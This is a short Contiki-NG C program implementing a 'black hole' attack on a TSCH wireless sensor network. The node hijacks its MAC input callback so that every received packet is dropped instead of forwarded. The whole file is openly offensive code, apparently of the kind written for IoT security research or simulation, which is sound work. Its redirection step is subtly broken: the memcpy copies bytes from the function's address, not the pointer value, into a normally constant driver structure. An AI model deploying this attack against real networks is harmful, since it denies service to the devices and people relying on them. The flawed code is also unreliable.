#include "contiki.h"
#include "net/netstack.h"
#include "net/routing/routing.h"
#include "net/packetbuf.h"
#include <stdio.h>
#include <string.h>

PROCESS(black_hole_attack_process, "Black Hole Attack Process");
AUTOSTART_PROCESSES(&black_hole_attack_process);

static void (*original_mac_input)(void);

//input packet 
static void malicious_packet_input(void) {
  printf("Black Hole: Packet received but will be dropped!\n");
  
  // Drop the packet by not calling the original MAC input function
  // Effectively making this node a black hole
  // there is no reply here to the message has been recieved 
}

/*---------------------------------------------------------------------------*/
static void set_mac_callbacks(void) {
  // Save original function pointer
  original_mac_input = NETSTACK_MAC.input;
  
  // Redirect MAC input function to malicious handler
  memcpy((void **)&NETSTACK_MAC.input, (void **)&malicious_packet_input, sizeof(void *));
 //NETSTACK_MAC.input = malicious_packet_input;

}

/*---------------------------------------------------------------------------*/
PROCESS_THREAD(black_hole_attack_process, ev, data) {
  static struct etimer et;
  PROCESS_BEGIN();

  // Wait for network to be ready
  etimer_set(&et, CLOCK_SECOND * 5);
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));

  // Enable TSCH
  NETSTACK_MAC.on();
  printf("Black Hole Node Activated!\n");

  // Set the malicious MAC callback to drop packets
  set_mac_callbacks();

  while(1) {
    PROCESS_YIELD();
  }

  PROCESS_END();
}

